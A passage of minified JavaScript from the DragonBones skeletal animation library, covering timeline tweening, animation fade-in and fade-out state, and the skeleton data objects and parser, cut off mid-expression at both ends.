?this._tweenEasing=NaN:isNaN(this._animationState.clip.tweenEasing)?this._tweenEasing=this._currentFrame.tweenEasing:this._tweenEasing=this._animationState.clip.tweenEasing,isNaN(this._tweenEasing)?this._tweenColor=this._tweenTransform=!1:(this._durationTransform.x=o.transform.x-this._currentFrame.transform.x,this._durationTransform.y=o.transform.y-this._currentFrame.transform.y,this._durationTransform.skewX=o.transform.skewX-this._currentFrame.transform.skewX,this._durationTransform.skewY=o.transform.skewY-this._currentFrame.transform.skewY,this._durationTransform.scaleX=o.transform.scaleX-this._currentFrame.transform.scaleX,this._durationTransform.scaleY=o.transform.scaleY-this._currentFrame.transform.scaleY,0==n&&(this._durationTransform.skewX=s.TransformUtil.formatRadian(this._durationTransform.skewX),this._durationTransform.skewY=s.TransformUtil.formatRadian(this._durationTransform.skewY)),this._durationPivot.x=o.pivot.x-this._currentFrame.pivot.x,this._durationPivot.y=o.pivot.y-this._currentFrame.pivot.y,this._tweenTransform=0!=this._durationTransform.x||0!=this._durationTransform.y||0!=this._durationTransform.skewX||0!=this._durationTransform.skewY||0!=this._durationTransform.scaleX||0!=this._durationTransform.scaleY||0!=this._durationPivot.x||0!=this._durationPivot.y,this._currentFrame.color&&o.color?(this._durationColor.alphaOffset=o.color.alphaOffset-this._currentFrame.color.alphaOffset,this._durationColor.redOffset=o.color.redOffset-this._currentFrame.color.redOffset,this._durationColor.greenOffset=o.color.greenOffset-this._currentFrame.color.greenOffset,this._durationColor.blueOffset=o.color.blueOffset-this._currentFrame.color.blueOffset,this._durationColor.alphaMultiplier=o.color.alphaMultiplier-this._currentFrame.color.alphaMultiplier,this._durationColor.redMultiplier=o.color.redMultiplier-this._currentFrame.color.redMultiplier,this._durationColor.greenMultiplier=o.color.greenMultiplier-this._currentFrame.color.greenMultiplier,this._durationColor.blueMultiplier=o.color.blueMultiplier-this._currentFrame.color.blueMultiplier,this._tweenColor=0!=this._durationColor.alphaOffset||0!=this._durationColor.redOffset||0!=this._durationColor.greenOffset||0!=this._durationColor.blueOffset||0!=this._durationColor.alphaMultiplier||0!=this._durationColor.redMultiplier||0!=this._durationColor.greenMultiplier||0!=this._durationColor.blueMultiplier):this._currentFrame.color?(this._tweenColor=!0,this._durationColor.alphaOffset=-this._currentFrame.color.alphaOffset,this._durationColor.redOffset=-this._currentFrame.color.redOffset,this._durationColor.greenOffset=-this._currentFrame.color.greenOffset,this._durationColor.blueOffset=-this._currentFrame.color.blueOffset,this._durationColor.alphaMultiplier=1-this._currentFrame.color.alphaMultiplier,this._durationColor.redMultiplier=1-this._currentFrame.color.redMultiplier,this._durationColor.greenMultiplier=1-this._currentFrame.color.greenMultiplier,this._durationColor.blueMultiplier=1-this._currentFrame.color.blueMultiplier):o.color?(this._tweenColor=!0,this._durationColor.alphaOffset=o.color.alphaOffset,this._durationColor.redOffset=o.color.redOffset,this._durationColor.greenOffset=o.color.greenOffset,this._durationColor.blueOffset=o.color.blueOffset,this._durationColor.alphaMultiplier=o.color.alphaMultiplier-1,this._durationColor.redMultiplier=o.color.redMultiplier-1,this._durationColor.greenMultiplier=o.color.greenMultiplier-1,this._durationColor.blueMultiplier=o.color.blueMultiplier-1):this._tweenColor=!1),this._tweenTransform||(this._animationState.blend?(this.transform.x=this._originTransform.x+this._currentFrame.transform.x,this.transform.y=this._originTransform.y+this._currentFrame.transform.y,this.transform.skewX=this._originTransform.skewX+this._currentFrame.transform.skewX,this.transform.skewY=this._originTransform.skewY+this._currentFrame.transform.skewY,this.transform.scaleX=this._originTransform.scaleX+this._currentFrame.transform.scaleX,this.transform.scaleY=this._originTransform.scaleY+this._currentFrame.transform.scaleY,this.pivot.x=this._originPivot.x+this._currentFrame.pivot.x,this.pivot.y=this._originPivot.y+this._currentFrame.pivot.y):(this.transform.x=this._currentFrame.transform.x,this.transform.y=this._currentFrame.transform.y,this.transform.skewX=this._currentFrame.transform.skewX,this.transform.skewY=this._currentFrame.transform.skewY,this.transform.scaleX=this._currentFrame.transform.scaleX,this.transform.scaleY=this._currentFrame.transform.scaleY,this.pivot.x=this._currentFrame.pivot.x,this.pivot.y=this._currentFrame.pivot.y)),this._tweenColor||(this._currentFrame.color?this._bone._updateColor(this._currentFrame.color.alphaOffset,this._currentFrame.color.redOffset,this._currentFrame.color.greenOffset,this._currentFrame.color.blueOffset,this._currentFrame.color.alphaMultiplier,this._currentFrame.color.redMultiplier,this._currentFrame.color.greenMultiplier,this._currentFrame.color.blueMultiplier,!0):this._bone._isColorChanged&&this._bone._updateColor(0,0,0,0,1,1,1,1,!1)),this._bone._arriveAtFrame(this._currentFrame,this,this._animationState,!1)),(this._tweenTransform||this._tweenColor)&&(e=(r-this._currentFramePosition)/this._currentFrameDuration,this._tweenEasing&&(e=t.getEaseValue(e,this._tweenEasing))),this._tweenTransform&&(i=this._currentFrame.transform,r=this._currentFrame.pivot,this._animationState.blend?(this.transform.x=this._originTransform.x+i.x+this._durationTransform.x*e,this.transform.y=this._originTransform.y+i.y+this._durationTransform.y*e,this.transform.skewX=this._originTransform.skewX+i.skewX+this._durationTransform.skewX*e,this.transform.skewY=this._originTransform.skewY+i.skewY+this._durationTransform.skewY*e,this.transform.scaleX=this._originTransform.scaleX+i.scaleX+this._durationTransform.scaleX*e,this.transform.scaleY=this._originTransform.scaleY+i.scaleY+this._durationTransform.scaleY*e,this.pivot.x=this._originPivot.x+r.x+this._durationPivot.x*e,this.pivot.y=this._originPivot.y+r.y+this._durationPivot.y*e):(this.transform.x=i.x+this._durationTransform.x*e,this.transform.y=i.y+this._durationTransform.y*e,this.transform.skewX=i.skewX+this._durationTransform.skewX*e,this.transform.skewY=i.skewY+this._durationTransform.skewY*e,this.transform.scaleX=i.scaleX+this._durationTransform.scaleX*e,this.transform.scaleY=i.scaleY+this._durationTransform.scaleY*e,this.pivot.x=r.x+this._durationPivot.x*e,this.pivot.y=r.y+this._durationPivot.y*e)),this._tweenColor&&(this._currentFrame.color?this._bone._updateColor(this._currentFrame.color.alphaOffset+this._durationColor.alphaOffset*e,this._currentFrame.color.redOffset+this._durationColor.redOffset*e,this._currentFrame.color.greenOffset+this._durationColor.greenOffset*e,this._currentFrame.color.blueOffset+this._durationColor.blueOffset*e,this._currentFrame.color.alphaMultiplier+this._durationColor.alphaMultiplier*e,this._currentFrame.color.redMultiplier+this._durationColor.redMultiplier*e,this._currentFrame.color.greenMultiplier+this._durationColor.greenMultiplier*e,this._currentFrame.color.blueMultiplier+this._durationColor.blueMultiplier*e,!0):this._bone._updateColor(this._durationColor.alphaOffset*e,this._durationColor.redOffset*e,this._durationColor.greenOffset*e,this._durationColor.blueOffset*e,1+this._durationColor.alphaMultiplier*e,1+this._durationColor.redMultiplier*e,1+this._durationColor.greenMultiplier*e,1+this._durationColor.blueMultiplier*e,!0))}else this._updateState=0,this._animationState.blend?(this.transform.copy(this._originTransform),this.pivot.x=this._originPivot.x,this.pivot.y=this._originPivot.y):(this.transform.x=this.transform.y=this.transform.skewX=this.transform.skewY=this.transform.scaleX=this.transform.scaleY=0,this.pivot.x=0,this.pivot.y=0),this._currentFrame=this._timeline.getFrameList()[0],this.tweenActive=0<=this._currentFrame.displayIndex,this._currentFrame.color?this._bone._updateColor(this._currentFrame.color.alphaOffset,this._currentFrame.color.redOffset,this._currentFrame.color.greenOffset,this._currentFrame.color.blueOffset,this._currentFrame.color.alphaMultiplier,this._currentFrame.color.redMultiplier,this._currentFrame.color.greenMultiplier,this._currentFrame.color.blueMultiplier,!0):this._bone._updateColor(0,0,0,0,1,1,1,1,!1),this._bone._arriveAtFrame(this._currentFrame,this,this._animationState,!1)},t.prototype.clear=function(){this._updateState=0,this._originPivot=this._originTransform=this._currentFrame=this._timeline=this._animationState=this._bone=null},t.HALF_PI=.5*Math.PI,t._pool=[],t}();t.TimelineState=o,o.prototype.__class__="dragonBones.animation.TimelineState";var a=function(){function t(){this.layer=this.loop=0,this._timelineStates={}}return t._borrowObject=function(){return 0==t._pool.length?new t:t._pool.pop()},t._returnObject=function(e){0>t._pool.indexOf(e)&&(t._pool[t._pool.length]=e),e.clear()},t._clear=function(){for(var e=t._pool.length;e--;)t._pool[e].clear();t._pool.length=0},t.prototype.fadeIn=function(t,e,i,n,r,s,o,a){this.layer=s,this.clip=e,this.name=this.clip.name,this.totalTime=this.clip.duration,this._armature=t,2>Math.round(this.clip.duration*this.clip.frameRate)||1/0==n?(this.timeScale=1,this.currentTime=this.totalTime,this.loop=0<=this.loop?1:-1):(this.timeScale=n,this.currentTime=0,this.loop=r),this._pauseBeforeFadeInComplete=a,this._fadeInTime=i*this.timeScale,this._fadeState=1,this._fadeOutBeginTime=0,this._fadeOutWeight=-1,this._fadeWeight=0,this._fadeIn=!0,this._fadeOut=!1,this.loopCount=-1,this.displayControl=o,this.isPlaying=!0,this.isComplete=!1,this.weight=1,this.tweenEnabled=this.enabled=this.blend=!0,this.updateTimelineStates()},t.prototype.fadeOut=function(t,e){if(void 0===e&&(e=!1),this._armature&&!(0<=this._fadeOutWeight)){this._fadeState=-1,this._fadeOutWeight=this._fadeWeight,this._fadeOutTime=t*this.timeScale,this._fadeOutBeginTime=this.currentTime,this._fadeOut=!0,this.isPlaying=!e,this.displayControl=!1;for(var i in this._timelineStates)this._timelineStates[i].fadeOut();this.enabled=!0}},t.prototype.play=function(){this.isPlaying=!0},t.prototype.stop=function(){this.isPlaying=!1},t.prototype.getMixingTransform=function(t){return this._mixingTransforms?Number(this._mixingTransforms[t]):-1},t.prototype.addMixingTransform=function(t,e,i){if(void 0===e&&(e=2),void 0===i&&(i=!0),!this.clip||!this.clip.getTimeline(t))throw Error();if(this._mixingTransforms||(this._mixingTransforms={}),i){i=this._armature._boneList.length;for(var n,r;i--;)(n=this._armature._boneList[i]).name==t&&(r=n),r&&(r==n||r.contains(n))&&(this._mixingTransforms[n.name]=e)}else this._mixingTransforms[t]=e;this.updateTimelineStates()},t.prototype.removeMixingTransform=function(t,e){if(void 0===t&&(t=null),void 0===e&&(e=!0),t){if(e)for(var i,n,r=this._armature._boneList.length;r--;)(i=this._armature._boneList[r]).name==t&&(n=i),n&&(n==i||n.contains(i))&&delete this._mixingTransforms[i.name];else delete this._mixingTransforms[t];for(var s in this._mixingTransforms){var o=!0;break}o||(this._mixingTransforms=null)}else this._mixingTransforms=null;this.updateTimelineStates()},t.prototype.advanceTime=function(t){if(!this.enabled)return!1;var e,n;if(this._fadeIn&&(this._fadeIn=!1,this._armature.hasEventListener(i.AnimationEvent.FADE_IN)&&(e=new i.AnimationEvent(i.AnimationEvent.FADE_IN),e.animationState=this,this._armature._eventList.push(e))),this._fadeOut&&(this._fadeOut=!1,this._armature.hasEventListener(i.AnimationEvent.FADE_OUT)&&(e=new i.AnimationEvent(i.AnimationEvent.FADE_OUT),e.animationState=this,this._armature._eventList.push(e))),this.currentTime+=t*this.timeScale,this.isPlaying&&!this.isComplete){var r;this._pauseBeforeFadeInComplete?(this.isPlaying=this._pauseBeforeFadeInComplete=!1,t=0,r=Math.floor(t)):(t=this.currentTime/this.totalTime,(r=Math.floor(t))!=this.loopCount&&(-1==this.loopCount&&this._armature.hasEventListener(i.AnimationEvent.START)&&(e=new i.AnimationEvent(i.AnimationEvent.START),e.animationState=this,this._armature._eventList.push(e)),this.loopCount=r)&&(this.loop&&this.loopCount*this.loopCount>=this.loop*this.loop-1?(n=!0,t=1,r=0,this._armature.hasEventListener(i.AnimationEvent.COMPLETE)&&(e=new i.AnimationEvent(i.AnimationEvent.COMPLETE),e.animationState=this,this._armature._eventList.push(e))):this._armature.hasEventListener(i.AnimationEvent.LOOP_COMPLETE)&&(e=new i.AnimationEvent(i.AnimationEvent.LOOP_COMPLETE),e.animationState=this,this._armature._eventList.push(e))));for(var s in this._timelineStates)this._timelineStates[s].update(t);if(0<(e=this.clip.getFrameList()).length){for(t=this.totalTime*(t-r),r=!1;!this._currentFrame||t>this._currentFrame.position+this._currentFrame.duration||t<this._currentFrame.position;)r&&this._armature._arriveAtFrame(this._currentFrame,null,this,!0),r=!0,this._currentFrame?(s=e.indexOf(this._currentFrame),++s>=e.length&&(s=0),this._currentFrame=e[s]):this._currentFrame=e[0];r&&this._armature._arriveAtFrame(this._currentFrame,null,this,!1)}}if(0<this._fadeState)0==this._fadeInTime?(this._fadeWeight=1,this._fadeState=0,this.isPlaying=!0,this._armature.hasEventListener(i.AnimationEvent.FADE_IN_COMPLETE)&&(e=new i.AnimationEvent(i.AnimationEvent.FADE_IN_COMPLETE),e.animationState=this,this._armature._eventList.push(e))):(this._fadeWeight=this.currentTime/this._fadeInTime,1<=this._fadeWeight&&(this._fadeWeight=1,this._fadeState=0,this.isPlaying||(this.currentTime-=this._fadeInTime),this.isPlaying=!0,this._armature.hasEventListener(i.AnimationEvent.FADE_IN_COMPLETE)&&(e=new i.AnimationEvent(i.AnimationEvent.FADE_IN_COMPLETE),e.animationState=this,this._armature._eventList.push(e))));else if(0>this._fadeState){if(0==this._fadeOutTime)return this._fadeState=this._fadeWeight=0,this._armature.hasEventListener(i.AnimationEvent.FADE_OUT_COMPLETE)&&(e=new i.AnimationEvent(i.AnimationEvent.FADE_OUT_COMPLETE),e.animationState=this,this._armature._eventList.push(e)),!0;if(this._fadeWeight=(1-(this.currentTime-this._fadeOutBeginTime)/this._fadeOutTime)*this._fadeOutWeight,0>=this._fadeWeight)return this._fadeState=this._fadeWeight=0,this._armature.hasEventListener(i.AnimationEvent.FADE_OUT_COMPLETE)&&(e=new i.AnimationEvent(i.AnimationEvent.FADE_OUT_COMPLETE),e.animationState=this,this._armature._eventList.push(e)),!0}return n&&(this.isComplete=!0,0>this.loop&&this.fadeOut((this._fadeOutWeight||this._fadeInTime)/this.timeScale,!0)),!1},t.prototype.updateTimelineStates=function(){if(this._mixingTransforms){for(var t in this._timelineStates)null==this._mixingTransforms[t]&&this.removeTimelineState(t);for(t in this._mixingTransforms)this._timelineStates[t]||this.addTimelineState(t)}else for(t in this.clip.getTimelines())this._timelineStates[t]||this.addTimelineState(t)},t.prototype.addTimelineState=function(t){var e=this._armature.getBone(t);if(e){var i=o._borrowObject(),n=this.clip.getTimeline(t);i.fadeIn(e,this,n),this._timelineStates[t]=i}},t.prototype.removeTimelineState=function(t){o._returnObject(this._timelineStates[t]),delete this._timelineStates[t]},t.prototype.clear=function(){this.clip=null,this.enabled=!1,this._mixingTransforms=this._currentFrame=this._armature=null;for(var t in this._timelineStates)this.removeTimelineState(t)},t._pool=[],t}();t.AnimationState=a,a.prototype.__class__="dragonBones.animation.AnimationState",n=function(){function t(t){this._armature=t,this._animationLayer=[],this._isPlaying=!1,this.animationNameList=[],this.tweenEnabled=!0,this.timeScale=1}return t.prototype.getLastAnimationName=function(){return this._lastAnimationState?this._lastAnimationState.name:null},t.prototype.getLastAnimationState=function(){return this._lastAnimationState},t.prototype.getAnimationDataList=function(){return this._animationDataList},t.prototype.setAnimationDataList=function(t){this._animationDataList=t,this.animationNameList.length=0;for(var e in this._animationDataList)this.animationNameList[this.animationNameList.length]=this._animationDataList[e].name},t.prototype.getIsPlaying=function(){return this._isPlaying&&!this.getIsComplete()},t.prototype.getIsComplete=function(){if(this._lastAnimationState){if(!this._lastAnimationState.isComplete)return!1;for(var t=this._animationLayer.length;t--;)for(var e=this._animationLayer[t],i=e.length;i--;)if(!e[i].isComplete)return!1;return!0}return!1},t.prototype.dispose=function(){if(this._armature){this.stop();for(var t=this._animationLayer.length;t--;){for(var e=this._animationLayer[t],i=e.length;i--;)a._returnObject(e[i]);e.length=0}this._animationLayer.length=0,this.animationNameList.length=0,this.animationNameList=this._animationDataList=this._animationLayer=this._armature=null}},t.prototype.gotoAndPlay=function(e,i,n,r,s,o,h,l,p,u){if(void 0===i&&(i=-1),void 0===n&&(n=-1),void 0===r&&(r=NaN),void 0===s&&(s=0),void 0===o&&(o=null),void 0===h&&(h=t.SAME_LAYER_AND_GROUP),void 0===l&&(l=!0),void 0===p&&(p=!0),void 0===u&&(u=!0),!this._animationDataList)return null;for(var d,c=this._animationDataList.length;c--;)if(this._animationDataList[c].name==e){d=this._animationDataList[c];break}if(!d)return null;this._isPlaying=!0,i=0>i?0>d.fadeInTime?.3:d.fadeInTime:i,n=0>n?0>d.scale?1:d.scale:n/d.duration,r=isNaN(r)?d.loop:r,s=this.addLayer(s);var _;switch(h){case t.NONE:break;case t.SAME_LAYER:for(c=(_=this._animationLayer[s]).length;c--;)(h=_[c]).fadeOut(i,p);break;case t.SAME_GROUP:for(g=this._animationLayer.length;g--;)for(_=this._animationLayer[g],c=_.length;c--;)(h=_[c]).group==o&&h.fadeOut(i,p);break;case t.ALL:for(var g=this._animationLayer.length;g--;)for(_=this._animationLayer[g],c=_.length;c--;)(h=_[c]).fadeOut(i,p);break;default:for(c=(_=this._animationLayer[s]).length;c--;)(h=_[c]).group==o&&h.fadeOut(i,p)}for(this._lastAnimationState=a._borrowObject(),this._lastAnimationState.group=o,this._lastAnimationState.tweenEnabled=this.tweenEnabled,this._lastAnimationState.fadeIn(this._armature,d,i,1/n,r,s,l,u),this.addState(this._lastAnimationState),c=(r=this._armature._slotList).length;c--;)s=r[c],(s=s.getChildArmature())&&s.animation.gotoAndPlay(e,i);return this._lastAnimationState},t.prototype.play=function(){this._animationDataList&&0!=this._animationDataList.length&&(this._lastAnimationState?this._isPlaying?this.gotoAndPlay(this._lastAnimationState.name):this._isPlaying=!0:this.gotoAndPlay(this._animationDataList[0].name))},t.prototype.stop=function(){this._isPlaying=!1},t.prototype.getState=function(t,e){void 0===e&&(e=0);var i=this._animationLayer.length;if(0==i)return null;if(e>=i&&(e=i-1),!(i=this._animationLayer[e]))return null;for(var n=i.length;n--;)if(i[n].name==t)return i[n];return null},t.prototype.hasAnimation=function(t){for(var e=this._animationDataList.length;e--;)if(this._animationDataList[e].name==t)return!0;return!1},t.prototype.advanceTime=function(t){if(this._isPlaying){t*=this.timeScale;var e,i,n,r,s,o,a,h,l,p,u,d,c,_,g,f,m,y,v,E=this._armature._boneList.length,x=E;for(E--;x--;){for(s=(r=this._armature._boneList[x]).name,o=1,_=c=d=u=p=l=h=a=0,e=this._animationLayer.length;e--;){for(g=0,n=(f=this._animationLayer[e]).length,i=0;i<n;i++)m=f[i],x==E&&m.advanceTime(t)?(this.removeState(m),i--,n--):(y=m._timelineStates[s])&&y.tweenActive&&(m=m._fadeWeight*m.weight*o,v=y.transform,y=y.pivot,a+=v.x*m,h+=v.y*m,l+=v.skewX*m,p+=v.skewY*m,u+=v.scaleX*m,d+=v.scaleY*m,c+=y.x*m,_+=y.y*m,g+=m);if(g>=o)break;o-=g}v=r.tween,y=r._tweenPivot,v.x=a,v.y=h,v.skewX=l,v.skewY=p,v.scaleX=u,v.scaleY=d,y.x=c,y.y=_}}},t.prototype.addLayer=function(t){return t>=this._animationLayer.length&&(t=this._animationLayer.length,this._animationLayer[t]=[]),t},t.prototype.addState=function(t){this._animationLayer[t.layer].push(t)},t.prototype.removeState=function(t){var e=t.layer,i=this._animationLayer[e];i.splice(i.indexOf(t),1),a._returnObject(t),0==i.length&&e==this._animationLayer.length-1&&this._animationLayer.length--},t.NONE="none",t.SAME_LAYER="sameLayer",t.SAME_GROUP="sameGroup",t.SAME_LAYER_AND_GROUP="sameLayerAndGroup",t.ALL="all",t}(),t.Animation=n,n.prototype.__class__="dragonBones.animation.Animation"}(t.animation||(t.animation={}));var n=t.animation;!function(t){var i=function(){function t(){this.skewY=this.skewX=this.y=this.x=0,this.scaleY=this.scaleX=1}return t.prototype.getRotation=function(){return this.skewX},t.prototype.setRotation=function(t){this.skewX=this.skewY=t},t.prototype.copy=function(t){this.x=t.x,this.y=t.y,this.skewX=t.skewX,this.skewY=t.skewY,this.scaleX=t.scaleX,this.scaleY=t.scaleY},t.prototype.toString=function(){return"[DBTransform (x="+this.x+" y="+this.y+" skewX="+this.skewX+" skewY="+this.skewY+" scaleX="+this.scaleX+" scaleY="+this.scaleY+")]"},t}();t.DBTransform=i,i.prototype.__class__="dragonBones.objects.DBTransform";var n=function(){function t(){this.duration=this.position=0}return t.prototype.dispose=function(){},t}();t.Frame=n,n.prototype.__class__="dragonBones.objects.Frame";var r=function(t){function n(){t.call(this),this.displayIndex=this.tweenRotate=this.tweenEasing=0,this.zOrder=NaN,this.visible=!0,this.global=new i,this.transform=new i,this.pivot=new e.Point}return __extends(n,t),n.prototype.dispose=function(){t.prototype.dispose.call(this),this.color=this.pivot=this.transform=this.global=null},n}(n);t.TransformFrame=r,r.prototype.__class__="dragonBones.objects.TransformFrame";var o=function(){function t(){this._frameList=[],this.duration=0,this.scale=1}return t.prototype.getFrameList=function(){return this._frameList},t.prototype.dispose=function(){for(var t=this._frameList.length;t--;)this._frameList[t].dispose();this._frameList.length=0,this._frameList=null},t.prototype.addFrame=function(t){if(!t)throw Error();if(!(0>this._frameList.indexOf(t)))throw Error();this._frameList[this._frameList.length]=t},t}();t.Timeline=o,o.prototype.__class__="dragonBones.objects.Timeline";var a=function(t){function n(){t.call(this),this.originTransform=new i,this.originPivot=new e.Point,this.offset=0,this.transformed=!1}return __extends(n,t),n.prototype.dispose=function(){this!=n.HIDE_TIMELINE&&(t.prototype.dispose.call(this),this.originPivot=this.originTransform=null)},n.HIDE_TIMELINE=new n,n}(o);t.TransformTimeline=a,a.prototype.__class__="dragonBones.objects.TransformTimeline";var h=function(t){function e(){t.call(this),this.loop=this.frameRate=0,this.tweenEasing=NaN,this.fadeInTime=0,this._timelines={}}return __extends(e,t),e.prototype.getTimelines=function(){return this._timelines},e.prototype.dispose=function(){t.prototype.dispose.call(this);for(var e in this._timelines)this._timelines[e].dispose();this._timelines=null},e.prototype.getTimeline=function(t){return this._timelines[t]},e.prototype.addTimeline=function(t,e){if(!t)throw Error();this._timelines[e]=t},e}(o);t.AnimationData=h,h.prototype.__class__="dragonBones.objects.AnimationData";var l=function(){function t(){this.transform=new i}return t.prototype.dispose=function(){this.pivot=this.transform=null},t.ARMATURE="armature",t.IMAGE="image",t}();t.DisplayData=l,l.prototype.__class__="dragonBones.objects.DisplayData";var p=function(){function t(){this._displayDataList=[],this.zOrder=0,this.blendMode="normal"}return t.prototype.getDisplayDataList=function(){return this._displayDataList},t.prototype.dispose=function(){for(var t=this._displayDataList.length;t--;)this._displayDataList[t].dispose();this._displayDataList.length=0,this._displayDataList=null},t.prototype.addDisplayData=function(t){if(!t)throw Error();if(!(0>this._displayDataList.indexOf(t)))throw Error();this._displayDataList[this._displayDataList.length]=t},t.prototype.getDisplayData=function(t){for(var e=this._displayDataList.length;e--;)if(this._displayDataList[e].name==t)return this._displayDataList[e];return null},t}();t.SlotData=p,p.prototype.__class__="dragonBones.objects.SlotData";var u=function(){function t(){this.length=0,this.global=new i,this.transform=new i,this.scaleMode=1,this.fixedRotation=!1}return t.prototype.dispose=function(){this.transform=this.global=null},t}();t.BoneData=u,u.prototype.__class__="dragonBones.objects.BoneData";var d=function(){function t(){this._slotDataList=[]}return t.prototype.getSlotDataList=function(){return this._slotDataList},t.prototype.dispose=function(){for(var t=this._slotDataList.length;t--;)this._slotDataList[t].dispose();this._slotDataList.length=0,this._slotDataList=null},t.prototype.getSlotData=function(t){for(var e=this._slotDataList.length;e--;)if(this._slotDataList[e].name==t)return this._slotDataList[e];return null},t.prototype.addSlotData=function(t){if(!t)throw Error();if(!(0>this._slotDataList.indexOf(t)))throw Error();this._slotDataList[this._slotDataList.length]=t},t}();t.SkinData=d,d.prototype.__class__="dragonBones.objects.SkinData";var c=function(){function t(){this._boneDataList=[],this._skinDataList=[],this._animationDataList=[]}return t.prototype.getBoneDataList=function(){return this._boneDataList},t.prototype.getSkinDataList=function(){return this._skinDataList},t.prototype.getAnimationDataList=function(){return this._animationDataList},t.prototype.dispose=function(){for(var t=this._boneDataList.length;t--;)this._boneDataList[t].dispose();for(t=this._skinDataList.length;t--;)this._skinDataList[t].dispose();for(t=this._animationDataList.length;t--;)this._animationDataList[t].dispose();this._boneDataList.length=0,this._skinDataList.length=0,this._animationDataList.length=0,this._animationDataList=this._skinDataList=this._boneDataList=null},t.prototype.getBoneData=function(t){for(var e=this._boneDataList.length;e--;)if(this._boneDataList[e].name==t)return this._boneDataList[e];return null},t.prototype.getSkinData=function(t){if(!t)return this._skinDataList[0];for(var e=this._skinDataList.length;e--;)if(this._skinDataList[e].name==t)return this._skinDataList[e];return null},t.prototype.getAnimationData=function(t){for(var e=this._animationDataList.length;e--;)if(this._animationDataList[e].name==t)return this._animationDataList[e];return null},t.prototype.addBoneData=function(t){if(!t)throw Error();if(!(0>this._boneDataList.indexOf(t)))throw Error();this._boneDataList[this._boneDataList.length]=t},t.prototype.addSkinData=function(t){if(!t)throw Error();if(!(0>this._skinDataList.indexOf(t)))throw Error();this._skinDataList[this._skinDataList.length]=t},t.prototype.addAnimationData=function(t){if(!t)throw Error();0>this._animationDataList.indexOf(t)&&(this._animationDataList[this._animationDataList.length]=t)},t.prototype.sortBoneDataList=function(){var t=this._boneDataList.length;if(0!=t){for(var e=[];t--;){for(var i=this._boneDataList[t],n=0,r=i;r&&r.parent;)n++,r=this.getBoneData(r.parent);e[t]={level:n,boneData:i}}for(e.sort(this.sortBoneData),t=e.length;t--;)this._boneDataList[t]=e[t].boneData}},t.prototype.sortBoneData=function(t,e){return t.level>e.level?1:-1},t}();t.ArmatureData=c,c.prototype.__class__="dragonBones.objects.ArmatureData";var _=function(){function t(){this._armatureDataList=[],this._subTexturePivots={}}return t.prototype.getArmatureNames=function(){var t,e=[];for(t in this._armatureDataList)e[e.length]=this._armatureDataList[t].name;return e},t.prototype.getArmatureDataList=function(){return this._armatureDataList},t.prototype.dispose=function(){for(var t in this._armatureDataList)this._armatureDataList[t].dispose();this._armatureDataList.length=0,this._subTexturePivots=this._armatureDataList=null},t.prototype.getArmatureData=function(t){for(var e=this._armatureDataList.length;e--;)if(this._armatureDataList[e].name==t)return this._armatureDataList[e];return null},t.prototype.addArmatureData=function(t){if(!t)throw Error();if(!(0>this._armatureDataList.indexOf(t)))throw Error();this._armatureDataList[this._armatureDataList.length]=t},t.prototype.removeArmatureData=function(t){0<=(t=this._armatureDataList.indexOf(t))&&this._armatureDataList.splice(t,1)},t.prototype.removeArmatureDataByName=function(t){for(var e=this._armatureDataList.length;e--;)this._armatureDataList[e].name==t&&this._armatureDataList.splice(e,1)},t.prototype.getSubTexturePivot=function(t){return this._subTexturePivots[t]},t.prototype.addSubTexturePivot=function(t,i,n){var r=this._subTexturePivots[n];return r?(r.x=t,r.y=i):this._subTexturePivots[n]=r=new e.Point(t,i),r},t.prototype.removeSubTexturePivot=function(t){if(t)delete this._subTexturePivots[t];else for(t in this._subTexturePivots)delete this._subTexturePivots[t]},t}();t.SkeletonData=_,_.prototype.__class__="dragonBones.objects.SkeletonData",o=function(){function t(){}return t.parseTextureAtlasData=function(t,i){if(void 0===i&&(i=1),!t)throw Error();var n={};n.__name=t[s.ConstValues.A_NAME];var r,o=t[s.ConstValues.SUB_TEXTURE];for(r in o){var a=(h=o[r])[s.ConstValues.A_NAME],h=new e.Rectangle(Number(h[s.ConstValues.A_X])/i,Number(h[s.ConstValues.A_Y])/i,Number(h[s.ConstValues.A_WIDTH])/i,Number(h[s.ConstValues.A_HEIGHT])/i);n[a]=h}return n},t.parseSkeletonData=function(e){if(!e)throw Error();var i=Number(e[s.ConstValues.A_FRAME_RATE]),n=new _;n.name=e[s.ConstValues.A_NAME],e=e[s.ConstValues.ARMATURE];for(var r in e)n.addArmatureData(t.parseArmatureData(e[r],n,i));return n},t.parseArmatureData=function(e,i,n){var r=new c;r.name=e[s.ConstValues.A_NAME];var o,a=e[s.ConstValues.BONE];for(o in a)r.addBoneData(t.parseBoneData(a[o]));a=e[s.ConstValues.SKIN];for(o in a)r.addSkinData(t.parseSkinData(a[o],i));s.DBDataUtil.transformArmatureData(r),r.sortBoneDataList(),e=e[s.ConstValues.ANIMATION];for(o in e)r.addAnimationData(t.parseAnimationData(e[o],r,n));return r},t.parseBoneData=function(e){var i=new u;i.name=e[s.ConstValues.A_NAME],i.parent=e[s.ConstValues.A_PARENT],i.length=Number(e[s.ConstValues.A_LENGTH])||0;var n=Number(e[s.ConstValues.A_SCALE_MODE]);return!isNaN(n)&&n&&(i.scaleMode=n),(n=e[s.ConstValues.A_FIXED_ROTATION])&&(i.fixedRotation=n),t.parseTransform(e[s.ConstValues.TRANSFORM],i.global),i.transform.copy(i.global),i},t.parseSkinData=function(e,i){var n=new d;n.name=e[s.ConstValues.A_NAME];var r,o=e[s.ConstValues.SLOT];for(r in o)n.addSlotData(t.parseSlotData(o[r],i));return n},t.parseSlotData=function(e,i){var n=new p;n.name=e[s.ConstValues.A_NAME],n.parent=e[s.ConstValues.A_PARENT],n.zOrder=Number(e[s.ConstValues.A_Z_ORDER]),n.blendMode=e[s.ConstValues.A_BLENDMODE],n.blendMode||(n.blendMode="normal");var r,o=e[s.ConstValues.DISPLAY];for(r in o)n.addDisplayData(t.parseDisplayData(o[r],i));return n},t.parseDisplayData=function(e,i){var n=new l;return n.name=e[s.ConstValues.A_NAME],n.type=e[s.ConstValues.A_TYPE],n.pivot=i.addSubTexturePivot(0,0,n.name),t.parseTransform(e[s.ConstValues.TRANSFORM],n.transform,n.pivot),n},t.parseAnimationData=function(e,i,n){var r=new h;if(r.name=e[s.ConstValues.A_NAME],r.frameRate=n,r.loop=Number(e[s.ConstValues.A_LOOP])||0,r.fadeInTime=Number(e[s.ConstValues.A_FADE_IN_TIME]),r.duration=Number(e[s.ConstValues.A_DURATION])/n,r.scale=Number(e[s.ConstValues.A_SCALE]),e.hasOwnProperty(s.ConstValues.A_TWEEN_EASING)){l=e[s.ConstValues.A_TWEEN_EASING];r.tweenEasing=void 